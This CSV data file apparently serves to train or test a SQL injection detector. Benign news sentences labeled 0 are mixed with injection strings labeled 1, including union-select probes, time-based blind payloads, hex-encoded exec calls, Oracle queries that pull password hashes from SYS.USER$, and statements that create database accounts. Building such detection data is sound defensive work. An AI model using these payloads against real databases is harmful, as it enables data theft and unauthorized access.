Sentence,Label
"The reconstruction railway crossing Trautwein tannery could , hand , bring entirely different problem regard access steep &quot; Geroltzhäuser Weg &quot;",0
&quot; NSA,0
declare @q nvarchar  ( 200 )  0x730065006c00650063 ...,1
"&quot; When animals saw otherwise expressionless dog move tail right (from tail-wagging dog &apos;s point view), stayed perfectly relaxed",0
They produced hard-fought two-hour match,0
"There one joint Parish Council Foundation Council , rector represented virtue office",0
"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"While formal requirement devote timetable maths , Coalition sources said extensive maths GCSE - combined weighting subject league tables - likely encourage schools provide extra teaching",0
8% past year,0
"In decoding, beam search used get optimal punctuation prediction results",0
tz_offset,1
"Due low level sunshine , autumn spring village Rjukan Vestfjord valley normally languishes shadows surrounding mountains",0
"There mortifying experience particular, fail wreak also general history; I mean foolish face praise, forced smile put company feel ease answer conversation interest us",0
"In fact , buy , kidding , consume 90 million pounds chocolate Halloween",0
""" )  or sleep ( __TIME__ )  = """,1
"select * from users where id = 1 or 1#""? = 1 union select 1,version (  )  -- 1",1
1 waitfor delay '0:0:10'--,1
"national security interests Europeans stay board us respect mutual anti-terrorism endeavors , &quot; Murphy , first-term Democrat chairman Senate Foreign Relations Subcommittee European Affairs , said interview Washington",0
"Only half dozen President &apos;s closest advisers -- including Daley , former Obama campaign chief Jim Messina , former White House senior advisers David Axelrod David Plouffe -- knew change consideration",0
'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' --,1
"select * from users where id = 1 or 1#""? union select version (  ) ,version (  )  -- 1",1
"But also connectivity , across UK 18 cities including Glasgow Edinburgh better connected HS2",0
"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )",1
"Previously , elderly citizens hosted service station canteen",0
"Transportation secretaries , 2011 report urged Congress move pay-per-mile direction",0
%7C,1
"Even though third-tier reserves Fredenbeck &apos;t exactly best form moment , Malmon issued warning advance I trained many players A-Youth",0
"If , Khan said , public gets comfortable",0
During course performance respective active scene illuminated,0
And heavier devices laptops continue stowed concern might injure someone go flying around cabin,0
Other revelations cited documents leaked Snowden NSA monitored German Chancellor Angela Merkel &apos;s cellphone 34 world leaders,0
"This case &quot; completely broken personality &quot; , views violence exploitation field normal",0
"TSV Freudenstadt I: Dominik Bäuerle , Yannik Büchle , Sebastian Dölker , Felix Pälchen , Stefan Räller , Simon Schenk Eduard Schulz",0
""" or """"^""",1
"select * from users where id = 11<1# union select 1,version (  )  -- 1",1
"Fay &apos;s innovation extended years , recently New York Comedy Festival",0
"This year , sexy inanimate objects rage",0
The issue resolved evening,0
"select * from users where id = 1 * ( \ )  union select null,@@VERSION -- 1",1
The appearance acne pubic hair common even infants toddlers,0
"select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1",1
select * from users where id = 1 or $<\. or 1 = 1 -- 1,1
She compared several German sayings corresponding Bible verses explained meaning,0
"Scotland Yard said served &quot; surrender notice &quot; 40-year-old Australian requiring appear police station , adding failure would make liable arrest",0
"9 billion spent , according NRF",0
"Thus, segmentation long texts necessary many real applications",0
Valero said popes typically elevated bishops large places position cardinal Francis &quot; full surprises -- &apos;t know &apos;ll name,0
Prof Vallortigara said &apos;t think dogs intentionally communicating movements,0
"Libertarians joined environmental groups lobbying allow government use little boxes keep track miles drive , possibly drive - use information draw tax bill",0
"There many benefits: The participants unemployed , companies receive trained skilled workers , continually increasing demand hotels restaurants , agency fund unemployment",0
"I voted Obama 2012 , I excited candidacy",0
"The patents cover technology helps match Internet search terms relevant advertising , lawsuit said , core Google &apos;s search business",0
He told FT meant agreement longer respected Frelimo,0
"E-readers , example , emit minimal transmissions turning page",0
"Schiltach &apos;s town master mason , Roland Grießhaber , explained peculiarities &quot; Am Hirschen &quot; railway crossing Town Council",0
"&quot; Minority Report &quot; originates year 1956 , exudes scent Cold War McCarthy Tribunal",0
Drescher said doctors still &quot; practicing model,0
"Certain species , rare butterflies grasshoppers , cannot get past barriers form forest areas",0
"The visitors show kept well informed , evaluations animals posted cages",0
"select * from users where id = 1 or ""_{"" or 1 = 1 -- 1",1
They choose device without GPS,0
"In Dick &apos;s world , alarmingly similar , mutants look future - police access insight",0
"1 million , total EUR 4",0
I &apos;ve reached point political despair,0
"select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",1
select * from users where id = 1 %!<1 or 1 = 1 -- 1,1
"&quot; It &apos;s easy , &quot; Bwelle said",0
"select * from users where id = '1' + @ ( 1 )  union select 1,version (  )  -- 1'",1
"admin"" )  or  ( ""1"" = ""1""/*",1
"That said , I hope finally start winning",0
"Therefore construction additional set lights necessary: &quot; Here safety comes first , &apos;s simple , &quot; said Arnold",0
select * from users where id = 1 <@$_ or 1 = 1 -- 1,1
select * from users where id = 1 &@ or 1 = 1 -- 1,1
select * from users where id = 1 + $+%1 or 1 = 1 -- 1,1
"Haigerloch: Focus Abendmahlskirche As town &apos;s contribution 150th anniversary Protestant Church Haigerloch , town &apos;s Office Culture Tourism dedicate last year &apos;s public thematic tours Sunday 27 October Abendsmahlskirche (Church Holy Communion)",0
"select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",1
GM recalls new pickup trucks U,0
pdf 201704/00001491529916625,0
"Inquiries revealed Ditta &quot; regular user &quot; Class A drug tests found traces cocaine hair , wallet credit cards",0
select * from users where id = 1   or 1 = 1 -- 1,1
"admin""/*",1
"The test , adopted , would applied criteria aimed preventing 457s used fill unskilled positions back door way move family friends Australia",0
"select * from users where id = 1 or 1#"", union select null,version (  )  -- 1",1
'  ( select top 1,1
An industry advisory committee created FAA examine issue recommended last month government permit greater use personal electronic devices,0
"If &apos;re looking extra credit , call Tim Susan Mathisdon Napa , Calif",0
"select * from users where id = 1 or \<  = 1 union select 1,@@VERSION -- 1",1
"&quot; For Scottish government , Keith Brown called Mr Carmichael &quot; unequivocally &quot; back Scotland &apos;s inclusion HS2 network",0
declare @s varchar  ( 200 )  select @s  =  0x73656c65637420404076657273696f6e exec ( @s ),1
The waist average 21st-century American male 39,0
&quot; Perry said dinner veteran rocker &quot; hit I 18,0
"select * from users where id = 1 or  ( \ )  = 1 union select 1,@@VERSION -- 1",1
"select * from users where id = '1' union select !<@,version (  )  -- 1'",1
grant connect to name; grant resource to name;,1
"The extent German commercial properties sought evident transaction volumes , said Ulbrich",0
"US borders: &quot; Super tunnel &quot; drug smuggling discovered On border Mexico USA , investigators discovered shut &quot; super tunnel &quot; intended drug smuggling",0
"Where is, nature",0
"select * from users where id = 1 or "";&"" or 1 = 1 -- 1",1
"That &apos;s around 600 million pounds worth Hershey bars , lollipops , Milk Duds , Twizzlers Clark Bars",0
"According Daily Nation , &quot; even one fine enough cripple FM stations",0
That &quot; Blade Runner &quot; problem,0
declare @s varchar ( 200 )  select @s  =  0x77616974666F722064656C61792027303A303A31302700 exec ( @s ),1
"The student volunteers usually pay way Cameroon , often arriving donated medical supplies",0
"And I-95 Coalition , includes 17 state transportation departments along Eastern Seaboard (including Maryland , Pennsylvania , Virginia Florida), studying could go implementing change",0
Mr Wilkie today said $ 325 million would count little &quot; unless &apos;s followed genuine reform put Tasmania &apos;s public health system sustainable footing,0
"select * from users where id = 1. union select null,version (  )  -- 1",1
The SPD would like put end pressure placed immigrant children decide one nationality - Union rejects notion dual passport,0
"Following recent meeting Snowden Moscow , German Green Party politician Hans-Christian Ströbele appealed USA continue threaten prosecution",0
"The FAA began restricting passengers &apos; use electronic devices 1966 response reports interference navigation communications equipment passengers began carrying FM radios , high-tech gadgets day",0
cgi yes sub0202 photo 2 1 yetglezip 71 75 e_qna view eng 25 47817 e_qna eng delete 41 24242 bbs314 129-945,0
Then watcher watched convicted future crime,0
' or ''&',1
Great works art affecting lesson us this,0
"Assaults former rebels escalated government forces attacked Renamo bases attempted kill Afonso Dhlakama , group &apos;s leader , Fernando Mazanga , Renamo &apos;s spokesman , told Financial Times",0
"select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1",1
"&quot; Today , Egyptian people laid foundation new life - absolute freedom , genuine democracy stability , &quot; said Morsi , 60-year-old US-trained engineer Muslim Brotherhood , fundamentalist group spent 84 years since inception outlawed organisation harshly targeted successive governments",0
"Because fewer investments made 2012 budgetary year planned , reserves also came higher",0
"As Reuters first reported July , seat layout exactly drives battle latest jets",0
"The City Magistrate today discussed submission head department transport , Stefan Majer (Green Party)",0
"In August , New York City agreed end practice storing names addresses people whose cases dismissed police stop",0
"Networking universities companies important On visit district Breisgau-Hochschwarzwald , explained Parliamentary President Guido Wolf Titisee-Neustadt workforce tomorrow come",0
1 billion,0
"select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",1
"select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1",1
The man &apos;s distraught nine-year-old son travelled Australia comforted since death father Wednesday adult cousin also vessel,0
or sleep ( __TIME__ ) #,1
"select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1",1
One group helpers take care clearance juniper bushes maintenance dry stone wall,0
"Following visit Nuclear Bunker Museum , focus turn Haigerloch period 1850 , Haigerloch came Prussian rule",0
"A report filed European Commission 2011 described intersex people different transsexual transgender people , status gender related instead relates biological makeup , neither exclusively male exclusively female , typical clearly defined either",0
"select * from users where id = 1 *$ . union select null,@@VERSION -- 1",1
picsearch,0
"Rumours affair involving Clarke first picked NotW &apos;s features desk source sexually interested Ms Pawlby told: &quot; Don &apos;t bother wasting time , &apos;s Charles",0
"&quot; We shortly make decision regarding whether play , &quot; said manager Thomas Tuchel",0
"Snowden referred complex legal situation , Ströbele said ARD &apos;s &quot; Panorama &quot; programme",0
Executives said new guidance would provided fourth quarter,0
"&quot; He put front firing squad , &quot; Ms Corteen told AAP",0
"The final straw came revealed Chancellor Angela Merkel &apos;s phone bugged , possibly decade",0
"Laura Glading , president Association Professional Flight Attendants , welcomed changes",0
"While course Scottish tradition , given touch Swabian colour Kaltenhof event grounds",0
"However , CCTV footage later revealed returned hotel safely becoming separated Australian boyfriend",0
"&quot; It interesting see whether new Pope nominate cardinals rest world restore balance , &quot; said",0
' or 'something'  =  'some'+'thing',1
The City Council must reach decision December,0
"admin"" or ""1"" = ""1""--",1
"&quot; It &apos;t distance , &quot; explains organiser Peter Saile",0
"select * from users where id = 1 + @<@# union select null,version (  )  -- 1",1
"Drew Bowler , managing director Bowler Motorsport , said: &quot; Rally customers coming Bowler changed",0
"However , sigh relief heard Ludwigsburg",0
"select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",1
It makes yearn many promises disappeared,0
""" or 0 = 0 --",1
' or username like char ( 37 ) ;,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"For medical nursing students O &apos;Malley , come United States Europe join Bwelle missions , &apos;s hands-on opportunity &apos;d never get home",0
The court question female victims,0
0x730065006c0065006300740020004000400076006500 ...,1
"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1
"But House leadership killed proposal , acting concerns rural lawmakers representing constituents whose daily lives often involve logging lots miles get work town",0
"select * from users where id = 1 or 1#""1 union select version (  ) ,version (  )  -- 1",1
select * from users where id = '1' or \<1 or 1 = 1 -- 1',1
"select * from users where id = 1 or "" ) ;"" or 1 = 1 -- 1",1
"The system fitted coloured LEDs , bright enough drivers easily see lights , even sun low sky",0
"select * from users where id = 1 or ""._"" or 1 = 1 -- 1",1
"The FDP spokesperson social youth-related affairs , Fritz Röhrenbeck wants dig deeper",0
"When user &quot; Anna &quot; sends email &quot; Benni &quot; , pair &apos;s computers directly connected ? Anna &apos;s email program browser first sends mail service provider &apos;s mail server",0
"For &quot; Cosmic Vision &quot; programme , looking ideas two major space projects , greatly advance research",0
"On 21 June , conjunction Schwarzwaldverein &#91; Black Forest Association &#93; Mid-Summer Festival , 12 July Arena , accompanied fireworks , 13 December first concert put Stadtmusik (Town Musical Society) new Festival Hall",0
"1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1
"select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1
"According Times &apos; national political correspondent Jonathan Martin , book provides thorough account effort senior officials inside campaign White House , namely former White House Chief Staff Bill Daley , measure effect swapping former Secretary State Clinton Vice President would polls",0
"The favourites , Andre Maier / Matthias Bronner , tied Michael Klippel Sadmin Osmicic (both teams SG Rohrweiler), meaning last two games produce victor",0
"We come wear one cut face figure, acquire degrees gentlest asinine expression",0
Second place taken Michael Klippel / Sadmin Osmicic partnership,0
The work HS2 Ltd suggests high-speed services Scotland north England start soon Phase One opens 2026,0
"&quot; New Express &apos;s editorial management disordered , &quot; regulator said statement",0
'hi' or 'x' = 'x';,1
""" ) ;waitfor delay '0:0:__TIME__'--",1
"select * from users where id = 1.<1# union select 1,version (  )  -- 1",1
Ã½ or 1 = 1 --,1
Killing,0
Figure 1 shows example parsing helps punctuation prediction transcribed speech text,0
asc,1
sqlvuln,1
"Driver speeding 130mph hot drink legs fined £ 1,000 A motorist fined £ 1,000 driving 130mph (210km / h) hot drink balanced legs",0
This reported broadcaster SABC,0
The bank promptly notified relevant authorities co-operating regulators,0
1 or sleep ( __TIME__ ) #,1
"For example, speech-to-speech translation, continuously transcribed speech texts need segmented fed subsequent machine translation systems (Takezawa et al",0
Law enforcement authorities Secret Services also legal authorisation intercept take note e-mails,0
Snowden made transparent intensive collaboration US intelligence services companies,0
"Stevie Rochelle Bamford initially found guilty Phuket provincial court June 15 making false claims telling Thai police local taxi driver , two men restraining , carried assault early hours Sunday June 10",0
"In future , announcements longer happen Vienna International Airport",0
"select * from users where id = 1 -@<@ union select 1,version (  )  -- 1",1
The first test plane unveiled March took flight first time September months delays,0
' or uname like '%,1
"Wrapped cellophane girdles , stumble dangerously high heels across set , either delivering monologues top voices lying completely silent stage",0
"admin"" or 1 = 1",1
"According details provided , tunnel yet put use",0
"&quot; A job like something achieve overnight , &quot; said Gerster praise annual financial statement",0
"select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1",1
"I much prefer lower strain, genuine equal, glittering unsteady",0
"Naturally, global contexts required model punctuation prediction, especially long-range dependencies",0
Mayor Erich Maier responded postal service communicated Lampertheim,0
"select * from users where id = 1 union select 1<@,version (  )  -- 1",1
' select * from information_schema.tables--,1
"select * from users where id = 1 union select 1 1a,version (  )  -- 1",1
"From 2015 , pupils required take standalone GCSE language , strong incentives choose English literature separate qualification",0
The goal adjustment create relaxing atmosphere,0
admin' or '1' = '1'/*,1
judges compromising necessity judge avoid appearance partiality part series media interviews public statements responding publicly criticism court,0
Where leave Scotland ? We choose region (essentially) Little England,0
The Vegetarian Association provide examples World Vegan Day 1 November,0
"During fire Helmbrechts , rescue services found charred body three-bedroom house",0
The prepaid mobiles thrown away afterwards,0
Clive Palmer claims PM Tony Abbott conflict interest parental leave scheme Billionaire MP Clive Palmer says Prime Minister Tony Abbott conflict interest parental leave scheme daughters might get pregnant benefit,0
"Worker falls ladder: seriously injured On Thursday , 51-year-old worker Eggelsberg fell ladder replacing broken external sensor seriously injured",0
exec sp,1
"The basis plans need protection expected floods , statistically occurs every 100 years , according German Weather Service",0
"However , soon became evident , due part age , could really keep fast pace Freudenstadt team",0
